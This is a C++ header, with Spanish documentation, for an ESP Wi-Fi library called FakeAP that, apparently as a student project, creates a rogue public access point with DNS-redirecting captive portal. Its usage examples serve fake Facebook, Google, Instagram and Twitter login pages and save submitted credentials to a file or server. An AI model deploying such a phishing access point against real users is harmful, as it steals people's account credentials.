/**
 * @file FakeAPlib.h
 * @authors NGUEYOU SIMO, Neil L.; MORENO ROMO, Lucas; RUBIO JIMÉNEZ, Mario
 * @brief Define la clase FakeAP que la clase principal del proyecto.
 * 
 * Incluye métodos para inicializar el punto de acceso, manejar solicitudes HTTP,
 * gestionar autenticación y administrar interacciones con la tarjeta SD.
 * 
 * @version 0.6
 * @date 2024-12-08
 * 
 * @copyright GNU Public License.
 * 
 */

#ifndef FAKEAPLIB_LIB
#define FAKEAPLIB_LIB

#include "./include/include.h"
#include "./include/SDCardManager.h"
#include "./include/WifiCaptivePortal.h"
#include "./include/WebServerHandler.h"


/*!
 * @class FakeAP
 * @brief Implementa la gestión del punto de acceso con portal cautivo y el servidor web.
 *        
 *
 * @details Esta clase combina la gestión de servidores y funcionalidades de red para crear
 * un punto de acceso WiFi que funcione como un portal cautivo. Proporciona métodos
 * para inicializar, configurar e iniciar el portal, además de un manejo flexible
 * de interacciones de usuario como inicio de sesión y envío de credenciales. Integra
 * redirección DNS, manejo de rutas HTTP y soporte opcional de tarjeta SD para servir
 * archivos y contenido multimedia en las páginas del portal cautivo.
 *
 * Uso típico:
 *  1. Instanciar un objeto FakeAP.
 *  2. Llamar a initialize(...) para configurar el punto de acceso.
 *  3. Iniciar el portal cautivo con `process()`.
 * 
 * @warning Es importante inicializar la tarjeta SD mediante el método `initialize()`
 *          antes de realizar cualquier operación.
 *
 * @note Todas las clases de este proyecto restringen la copia al eliminar constructores
 *       de copia y el operadores de asignación.
 * 
 * @see WebServerManager, WiFiCaptiveManager
 * 
 * 
 * Ejemplo de uso para crear un punto de acceso falso:
 * @code{.cpp}
 * FakeAP fakeAP; // se va a llamar al constructor por defecto e
 *                // inicar el servidor en el puerto 80 (por defecto)
 * FakeAP fakeAP(8080); // o inicia el servidor en el puerto indicado: 8080
 * 
 * void setup()
 * {
 *     // your setup...
 * 
 *     fakeAP.setPath("/webpages/index.html",  INDEXPAGE); // pagina principal o de inicio
 * 
 *     //configuración de la wifi
 *     WiFi.hostname("ESP.accesspoint");
 *     WiFi.softAPConfig(IPAddress(192,168,1,1), IPAddress(192,168,1,1), IPAddress(255, 255, 255, 0));
 * 
 *     // iniciar un punto de acceso público que se conecta a un servidor
 *      if (fakeAP.initialize("public-wifi", "", "wifi-server-ssid", "wifi-server-osw"))
 *          Serial.println("Error en la configuración del punto de acceso"); // en caso de fallo
 * }
 * 
 * 
 * void loop()
 * {
 *     fakeAP.process();
 * }
 * @endcode
 * 
 * Ejemplo de uso para crear un servivor web:
 * @code{.cpp}
 * FakeAP server = FakeAP(); // se va a llamar al constructor por defecto e
 *                           // inicar el servidor en el puerto 80 (por defecto)
 * 
 * FakeAP sever = FakeAP(8080); // o inicia el servidor en el puerto indicado: 8080
 * 
 * void setup()
 * {
 *     // your setup...
 * 
 *     server.setPath("/data/data.json",  DATAFILE);           // ruta del archivo donde se almacenan la credenciales enviadas
 *     server.setPath("/webpages/index.html",  INDEXPAGE);     // pagina principal o de inicio
 *     server.setPath("/webpages/admin.html",  ADMINPAGE);     // pagina del panel de administrador
 *     server.setPath("/webpages/facebook.html",  FACEBOOK);   // pagina de incio de sesión con facebook
 *     server.setPath("/webpages/google.html",  GOOGLE);       // pagina de incio de sesión con google
 *     server.setPath("/webpages/instagram.html",  INSTAGRAM); // pagina de incio de sesión con instagram
 *     server.setPath("/webpages/twitter.html",  TWITTER);     // pagina de incio de sesión con twitter
 * 
 *     //configuración de la wifi
 *     WiFi.hostname("ESP.server");
 *     WiFi.softAPConfig(IPAddress(10,10,1,1), IPAddress(10,10,1,1), IPAddress(255, 255, 255, 0));
 * 
 *     // iniciar un punto de acceso público que se conecta a un servidor
 *      if (server.initialize("private-server-wifi", "private-server-psw", "personal-wifi-ssid", "personal-wifi-psw"))
 *          Serial.println("Error en la configuración servidor"); // en caso de fallo
 * }
 * 
 * void loop()
 * {
 *     server.process();
 * }
 * 
 * @endcode
 * 
 * 
 */
class FakeAP
    : public WebServerManager, public WiFiCaptiveManager
{

    /*!
     * @brief Inicia el servidor DNS para redirigir todo dominio a la IP del portal cautivo.
     *
     * Llama al método start(...) del objeto DNS configurando el puerto y la IP local,
     * permitiendo capturar las solicitudes de los clientes.
     */
    void setupCaptivePortal(void);

    /*!
	* @brief Manejador para la ruta raíz del punto de acceso ("/").
	*
	* Lee el contenido de la página de índice desde la SD y la envía al cliente que hizo la solicitud.
	*/
    void handleRoot(void);

    /**
    * @brief Maneja la solicitud de inicio de sesión.
    * 
    * Determina la plataforma de la que proviene el inicio de sesión y
    * solicta la página correspondiente al servidor.
    */
    void handleLogin(void);


   /**
    * @brief Maneja el evento de envío de credenciales (después del inicio de sesión).
    * 
    * Procesa la información enviada por el cliente y la manda al servidor.
    */
    void handleSubmit(void);


    /**
     * @brief Maneja el envio de iconos/imagenes por respuesta HTTP.
     * 
     * Se envian en troncos de bytes. 
     */
    void handleIcons(void);

    /**
     * @brief Solicita los iconos/imagenes usadas en las paginas de redes sociales al servidor.
     * 
     * Realiza una solictud HTTP al servidor web indicando la ruta de la imagen.  
     * 
     * @param[in] iconName la ruta del archivo que se solicita
     */
    void getImageFile(const String& iconName);
public:

    /**
     * @brief Constructor por defecto de la clase `FakeAP`
     * 
     * Hay que notar que un objeto de esta clase se crea por defecto llamando al constructor
     * parametrizado de la clase base, usando los parametros por defectos para crear un
     * nuevo objeto de la clase `SDCardManager` y un numero de puerto para iniciar el servidor.
     * 
     */
    FakeAP();

    /**
    * @brief Constructor que permite especificar el puerto para el servidor.
    * 
    * @param[in] port Puerto a utilizar.
    */
    FakeAP(const uint8_t& port);

    FakeAP(const FakeAP&) = delete;

    FakeAP operator=(const FakeAP&) = delete;


    /**
     * @brief Inicializa la biblioteca FakeAP configurando el punto de acceso y la conexión WiFi
     * 
     * @param[in] AP_SSID Nombre de la red del punto de acceso a crear
     * @param[in] AP_PSW Contraseña del punto de acceso (opcional, por defecto vacío)
     * @param[in] WIFI_SSID Nombre de la red WiFi a la que conectarse (opcional, por defecto vacío)
     * @param[in] WIFI_PSW Contraseña de la red WiFi (opcional, por defecto vacío)
     * @return true si la inicialización fue exitosa
     * @return false si hubo algún error durante la inicialización
     */
    bool initialize(const String &AP_SSID, const String &AP_PSW = "\0", 
                        const String &WIFI_SSID = "\0", const String &WIFI_PSW = "\0");

    
    /**
     * @brief Inicia el servidor del portal cautivo.
     * 
     * Esta función inicializa y arranca el servidor del portal cautivo, que acturá
     * como un punto de acceso público.
     */
    void startCaptiveServer(void);

};

#ifndef FAKEAP_NO_GLOBALS

#endif //FAKEAP_NO_GLOBALS

#endif //FAKEAPLIB_LIB